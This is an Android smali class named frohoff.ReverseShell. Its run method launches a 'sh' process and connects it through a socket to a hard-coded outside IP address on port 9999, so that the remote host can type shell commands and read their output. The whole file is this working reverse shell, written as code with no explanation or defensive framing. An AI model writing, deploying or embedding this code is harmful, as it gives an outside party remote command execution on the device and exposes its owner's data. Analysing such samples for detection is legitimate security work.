.class public Lfrohoff/ReverseShell;
.super Ljava/lang/Object;
.source "ReverseShell.java"


# direct methods
.method public constructor <init>()V
    .locals 0

    .line 15
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public static run()V
    .locals 14

    .line 17
    const-string v0, "185.227.110.50"

    .line 18
    .local v0, "host":Ljava/lang/String;
    const/16 v1, 0x270f

    .line 19
    .local v1, "port":I
    const-string v2, "sh"

    .line 20
    .local v2, "cmd":Ljava/lang/String;
    const/4 v3, 0x1

    .line 21
    .local v3, "verbose":Z
    const-wide/16 v4, 0x0

    .line 24
    .local v4, "loop_sleep":J
    :try_start_0
    new-instance v6, Ljava/lang/ProcessBuilder;

    const/4 v7, 0x1

    new-array v8, v7, [Ljava/lang/String;

    const/4 v9, 0x0

    aput-object v2, v8, v9

    invoke-direct {v6, v8}, Ljava/lang/ProcessBuilder;-><init>([Ljava/lang/String;)V

    invoke-virtual {v6, v7}, Ljava/lang/ProcessBuilder;->redirectErrorStream(Z)Ljava/lang/ProcessBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/ProcessBuilder;->start()Ljava/lang/Process;

    move-result-object v6

    .line 25
    .local v6, "p":Ljava/lang/Process;
    new-instance v7, Ljava/net/Socket;

    invoke-direct {v7, v0, v1}, Ljava/net/Socket;-><init>(Ljava/lang/String;I)V

    .line 26
    .local v7, "s":Ljava/net/Socket;
    invoke-virtual {v6}, Ljava/lang/Process;->getInputStream()Ljava/io/InputStream;

    move-result-object v8

    .local v8, "pi":Ljava/io/InputStream;
    invoke-virtual {v6}, Ljava/lang/Process;->getErrorStream()Ljava/io/InputStream;

    move-result-object v9

    .local v9, "pe":Ljava/io/InputStream;
    invoke-virtual {v7}, Ljava/net/Socket;->getInputStream()Ljava/io/InputStream;

    move-result-object v10

    .line 27
    .local v10, "si":Ljava/io/InputStream;
    invoke-virtual {v6}, Ljava/lang/Process;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v11

    .local v11, "po":Ljava/io/OutputStream;
    invoke-virtual {v7}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v12

    .line 28
    .local v12, "so":Ljava/io/OutputStream;
    :goto_0
    invoke-virtual {v7}, Ljava/net/Socket;->isClosed()Z

    move-result v13

    if-nez v13, :cond_3

    .line 29
    :goto_1
    invoke-virtual {v8}, Ljava/io/InputStream;->available()I

    move-result v13

    if-lez v13, :cond_0

    invoke-virtual {v8}, Ljava/io/InputStream;->read()I

    move-result v13

    invoke-virtual {v12, v13}, Ljava/io/OutputStream;->write(I)V

    goto :goto_1

    .line 30
    :cond_0
    :goto_2
    invoke-virtual {v9}, Ljava/io/InputStream;->available()I

    move-result v13

    if-lez v13, :cond_1

    invoke-virtual {v9}, Ljava/io/InputStream;->read()I

    move-result v13

    invoke-virtual {v12, v13}, Ljava/io/OutputStream;->write(I)V

    goto :goto_2

    .line 31
    :cond_1
    :goto_3
    invoke-virtual {v10}, Ljava/io/InputStream;->available()I

    move-result v13

    if-lez v13, :cond_2

    invoke-virtual {v10}, Ljava/io/InputStream;->read()I

    move-result v13

    invoke-virtual {v11, v13}, Ljava/io/OutputStream;->write(I)V

    goto :goto_3

    .line 32
    :cond_2
    invoke-virtual {v12}, Ljava/io/OutputStream;->flush()V

    .line 33
    invoke-virtual {v11}, Ljava/io/OutputStream;->flush()V

    .line 34
    invoke-static {v4, v5}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_2
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_1

    .line 36
    :try_start_1
    invoke-virtual {v6}, Ljava/lang/Process;->exitValue()I
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_2
    .catch Ljava/lang/InterruptedException; {:try_start_1 .. :try_end_1} :catch_1

    .line 37
    goto :goto_4

    .line 38
    :catch_0
    move-exception v13

    .line 39
    goto :goto_0

    .line 41
    :cond_3
    :goto_4
    :try_start_2
    invoke-virtual {v6}, Ljava/lang/Process;->destroy()V

    .line 42
    invoke-virtual {v7}, Ljava/net/Socket;->close()V
    :try_end_2
    .catch Ljava/io/IOException; {:try_start_2 .. :try_end_2} :catch_2
    .catch Ljava/lang/InterruptedException; {:try_start_2 .. :try_end_2} :catch_1

    goto :goto_5

    .line 45
    .end local v6    # "p":Ljava/lang/Process;
    .end local v7    # "s":Ljava/net/Socket;
    .end local v8    # "pi":Ljava/io/InputStream;
    .end local v9    # "pe":Ljava/io/InputStream;
    .end local v10    # "si":Ljava/io/InputStream;
    .end local v11    # "po":Ljava/io/OutputStream;
    .end local v12    # "so":Ljava/io/OutputStream;
    :catch_1
    move-exception v6

    .line 46
    .local v6, "e":Ljava/lang/InterruptedException;
    if-eqz v3, :cond_5

    const-string v7, "frohoff.ReverseShell"

    const-string v8, "e"

    invoke-static {v7, v8, v6}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    goto :goto_6

    .line 43
    .end local v6    # "e":Ljava/lang/InterruptedException;
    :catch_2
    move-exception v6

    .line 44
    .local v6, "e":Ljava/io/IOException;
    if-eqz v3, :cond_4

    const-string v7, "frohoff.ReverseShell"

    const-string v8, "e"

    invoke-static {v7, v8, v6}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    .line 47
    .end local v6    # "e":Ljava/io/IOException;
    :cond_4
    :goto_5
    nop

    .line 48
    :cond_5
    :goto_6
    return-void
.end method
